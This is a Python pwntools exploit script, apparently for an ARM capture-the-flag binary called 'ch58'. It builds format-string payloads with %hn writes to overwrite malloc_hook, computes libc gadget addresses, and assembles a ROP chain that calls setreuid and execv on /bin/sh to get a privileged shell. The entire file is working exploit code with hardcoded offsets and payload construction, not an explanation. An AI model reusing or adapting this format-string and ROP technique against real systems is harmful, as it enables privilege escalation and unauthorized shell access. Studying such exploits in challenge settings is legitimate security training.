#!/usr/bin/python


# file ch58
# set architecture arm
# target remote 127.0.0.1:1234

# qemu-arm -L /usr/arm-linux-gnueabi/ -g 1234 ./ch58


from pwn import *
import binascii
import time
import sys



def mod65536(a, b):
    return ((a-b)+0x10000)%0x10000

def craft_payload(t, prev=0):
    res = ""
    for i in t:
        res += "%"+str(mod65536(i[0], prev))+"u%"+str(i[1])+"$hn"
        prev = i[0]
    return (res, prev)

def send_recv(payload, r):
    r.sendline(payload+';;;;;;;')
    tmp = r.recvuntil(';;;;;;;', timeout=0.2)
    if tmp != '':
        ret = tmp.split(';;;;;;;')[0]
    else:
        ret = ""
    while tmp != '':
        tmp = r.recvuntil(';;;;;;;', timeout=0.05)
        if tmp != '':
            ret = tmp.split(';;;;;;;')[0]
    return ret

def init_write_addr(leak_env, r, text=False):
    high = leak_env >> 16
    offset = (leak_env & 0xffff) + 0x80
    if not text:
        send_recv("%"+str(offset)+"u%94$hn", r)
        send_recv("%"+str(offset+8)+"u%95$hn", r)
        offset += 2
        send_recv("%"+str(offset)+"u%94$hn", r)
        send_recv("%"+str(high)+"u%95$hn", r)
        offset += 2
        send_recv("%"+str(offset)+"u%94$hn", r)
        send_recv("%"+str(offset+6)+"u%95$hn", r)
        offset += 2
        send_recv("%"+str(offset)+"u%94$hn", r)
        send_recv("%"+str(high)+"u%95$hn", r)
    else:
        res = ""
        t = [(offset,94), (offset+8,95), (offset+2,94), (high,95), (offset+6,94), (high,95), (offset+4,94), (offset+10,95)]
        for i in t:
            res += craft_payload([i])[0]+"\n"
        return res

def write_addr(addr, r, text=False, prev=0):
    low = addr & 0xffff
    high = addr >> 16
    if not text:
        send_recv("%"+str(low)+"u%111$hn", r)
        send_recv("%"+str(high)+"u%112$hn", r)
    else:
        t = [(low,111+16), (high,112+16)]
        return craft_payload(t)

def write_addr_one_liner(addr, env_leaked, N, r):
    offset = env_leaked+0x8c
    res = ""
    for i in range(2*N):
        res += write_addr(offset+2*i, r, True)[0]+"\n"
        cur = addr+i
        if i%2 == 0:
            cur = cur & 0xffff
        else:
            cur = cur >> 16
        res += craft_payload([(cur,113+16)])[0]+'\n'
    return res

def write_multiple_one_liner(addr, env_leaked, to_write, r):
    res = write_addr_one_liner(addr, env_leaked, 2*len(to_write), r)
    t = []
    for i in range(2*len(to_write)):
        if i%2 == 0:
            cur = to_write[i//2] & 0xffff
        else:
            cur = to_write[i//2] >> 16
        t.append((cur, 114+i+16))

    return res+craft_payload(t)[0]


if len(sys.argv) < 5:
    print("Usage : "+sys.argv[0]+" [bss] [stack] [libc] [env]")
    exit()

#%4$p %7$p %9$p %94$p

bss = int(sys.argv[1], 16)
stack = int(sys.argv[2], 16)
libc = int(sys.argv[3], 16)
env = int(sys.argv[4], 16)

setreuid = libc+0x77712
system = libc+0x15ed6
execv = libc+0x59862
exit = libc+0xf94e
#pop_all_ret = libc+0x4e361
pop_r0_r4_pc = libc+0x40191
ldm_r0_to_pc = libc+0x8f571
# 0x0002e758 : pop {r0, r1, r2, ip, sp, pc}
pop_r0_r1_r2_ip_sp_pc = libc+0x17ead
# 0x00091b34 : pop {r0, r1, ip, pc}
pop_r0_r1_pc = libc+0x17ead+0x00091b34-0x0002e758
# 0x0009cf80 : svc #0xe0f778 ; andhs fp, r1, sp, ror #18 ; pop {r0, r2, ip, sp, pc}
svc = libc+0x17ead+0x0009cf80-0x0002e758
stdin_hook = libc+0xd13a1
free_hook = libc+0xd2e5d
malloc_hook = free_hook-0xb10

script_address = bss

print(init_write_addr(env, None, True))
#print(write_multiple_one_liner(script_address, env, [0x6e69622f, 0x68732f], None))
#print(write_multiple_one_liner(script_address, env, [0x706d742f, 0x732f612f, 0x70697263, 0x732e3274, 0x68], None))
print(write_multiple_one_liner(malloc_hook, env, [ldm_r0_to_pc], None))
#print("/bin/sh;CCCCDDDDEEEEFFFFGGGGHHHHIIII"+p32(pop_r0_r1_pc)+p32(bss)+p32(0)*4+p32(setreuid)+p32(system)+"%"+str(script_address-0x20)+"u")

payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"+"sppo"+"pop2"+"popr"+"0000"*3+"setr"+"bsss"+"0000"+"syss"+"%"+str(script_address-0x20)+"u"
print(payload)

offset = 0x80
t = [(bss+offset, 0x6e69622f), (bss+offset+0x4, 0x68732f), (bss+offset+0x8, 0), (bss+offset+0xc, bss+offset), (bss+offset+0x10, 0), (bss+0x1c, bss+0x28), (bss+0x20, pop_r0_r1_r2_ip_sp_pc),
    (bss+0x24, pop_r0_r1_pc), (bss+0x28, 0), (bss+0x2c, 0), (bss+0x30, 0), (bss+0x34, setreuid), (bss+0x38, bss+offset), (bss+0x3c, bss+offset+0xc), (bss+0x40, 0), (bss+0x48, bss+0x50), (bss+0x4c, execv)]
for i,j in t:
    print("set *"+hex(i)+"="+hex(j))

payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
payload += p32(bss+0x28)
payload += p32(pop_r0_r1_r2_ip_sp_pc)
payload += p32(pop_r0_r1_pc)
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(setreuid)
payload += p32(bss+offset)
payload += p32(bss+offset+0xc)
payload += p32(0)
payload += p32(0)
payload += p32(bss+0x50)
payload += p32(execv)
payload += "O"*(offset-len(payload))
payload += p32(0x6e69622f)
payload += p32(0x68732f)
payload += p32(0)
payload += p32(bss+offset)
payload += p32(0)
payload += "%"+str(script_address-0x20)+"u"
